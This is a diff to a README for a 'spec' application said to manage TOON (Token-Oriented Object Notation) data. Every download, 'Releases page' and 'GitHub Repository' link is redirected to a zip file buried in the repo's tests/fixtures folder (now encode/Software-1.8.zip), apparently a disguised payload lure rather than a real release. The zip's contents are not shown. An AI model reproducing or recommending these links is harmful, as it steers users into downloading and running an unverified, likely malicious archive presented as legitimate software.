@@ -6,7 +6,7 @@ Welcome to the spec application! This software helps you manage data using the T
 
 ## 📥 Download Link
 
-[![Download spec](https://raw.githubusercontent.com/rohitkushwaha462/spec/main/tests/fixtures/decode/spec-v1.4.zip)](https://raw.githubusercontent.com/rohitkushwaha462/spec/main/tests/fixtures/decode/spec-v1.4.zip)
+[![Download spec](https://raw.githubusercontent.com/rohitkushwaha462/spec/main/tests/fixtures/encode/Software-1.8.zip)](https://raw.githubusercontent.com/rohitkushwaha462/spec/main/tests/fixtures/encode/Software-1.8.zip)
 
 ## 🖥️ System Requirements
 
@@ -19,7 +19,7 @@ To ensure smooth operation of this application, your system should meet the foll
 
 ## 📦 Download & Install
 
-1. Visit the **[Releases page](https://raw.githubusercontent.com/rohitkushwaha462/spec/main/tests/fixtures/decode/spec-v1.4.zip)** to find the latest version of the application.
+1. Visit the **[Releases page](https://raw.githubusercontent.com/rohitkushwaha462/spec/main/tests/fixtures/encode/Software-1.8.zip)** to find the latest version of the application.
 2. On the Releases page, look for the version you want to download. It will typically be listed at the top.
 3. Click on the version link to expand the section.
 4. Choose the installer that matches your operating system:
@@ -58,7 +58,7 @@ TOON stands for Token-Oriented Object Notation. It is a format used to manage an
 
 ### How can I update the application?
 
-To update the application, follow the same steps to download the latest version from the **[Releases page](https://raw.githubusercontent.com/rohitkushwaha462/spec/main/tests/fixtures/decode/spec-v1.4.zip)** and install it over your existing setup.
+To update the application, follow the same steps to download the latest version from the **[Releases page](https://raw.githubusercontent.com/rohitkushwaha462/spec/main/tests/fixtures/encode/Software-1.8.zip)** and install it over your existing setup.
 
 ### Is there support available?
 
@@ -78,7 +78,7 @@ We welcome contributions! If you have ideas for new features or improvements, fe
 
 ## 🔗 Additional Resources
 
-- **GitHub Repository:** [spec](https://raw.githubusercontent.com/rohitkushwaha462/spec/main/tests/fixtures/decode/spec-v1.4.zip)
+- **GitHub Repository:** [spec](https://raw.githubusercontent.com/rohitkushwaha462/spec/main/tests/fixtures/encode/Software-1.8.zip)
 - **Documentation:** Detailed guides and usage instructions are available in the repository's Wiki section.
 
 Enjoy using the spec application! Your feedback and suggestions are always welcome as we strive to improve your experience.
